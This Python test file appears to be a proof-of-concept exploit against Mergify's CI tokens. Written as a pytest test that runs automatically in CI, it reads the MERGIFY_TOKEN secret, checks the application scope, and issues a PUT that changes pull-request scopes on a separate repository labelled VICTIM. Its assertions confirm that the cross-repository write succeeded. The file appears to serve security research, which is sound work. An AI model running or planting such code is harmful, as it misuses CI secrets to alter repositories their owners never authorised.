import json
import os
import urllib.error
import urllib.request

OWNER = "vm2-billing-checkout-v7m3-260916"
VICTIM = "mrg-vm2-source-secret-sibling-0923-c8p4"
PR_NUMBER = 3
SCOPE = "vm2-cikey-external-chain-1005"


def _request(url, token, method="GET", payload=None):
    data = None if payload is None else json.dumps(payload, separators=(",", ":")).encode()
    req = urllib.request.Request(
        url,
        data=data,
        method=method,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "vm2-controlled-cikey-chain-1005",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def test_external_fork_synthetic_cikey_sibling_scope_chain():
    token = os.environ.get("MERGIFY_TOKEN", "").strip()
    print(f"VM2_CIKEY_CHAIN_TOKEN_PRESENT={1 if token else 0}")
    if not token:
        print("VM2_CIKEY_CHAIN_SCOPE_WRITE_SKIPPED=1")
        return

    app_status, app_body = _request("https://api.mergify.com/v1/application", token)
    app = json.loads(app_body) if app_body else {}
    account = app.get("account_scope") or {}
    print(f"VM2_CIKEY_CHAIN_APPLICATION_HTTP={app_status}")
    print(f"VM2_CIKEY_CHAIN_APPLICATION_SCOPE={app.get('scope')}")
    print(f"VM2_CIKEY_CHAIN_APPLICATION_ACCOUNT={account.get('login')}")

    scope_status, _ = _request(
        f"https://api.mergify.com/v1/repos/{OWNER}/{VICTIM}/pulls/{PR_NUMBER}/scopes",
        token,
        method="PUT",
        payload={"scopes": [SCOPE], "all_scopes": False},
    )
    print(f"VM2_CIKEY_CHAIN_SIBLING_SCOPE_HTTP={scope_status}")
    assert app_status == 200
    assert app.get("scope") == "ci"
    assert account.get("login") == OWNER
    assert scope_status == 204
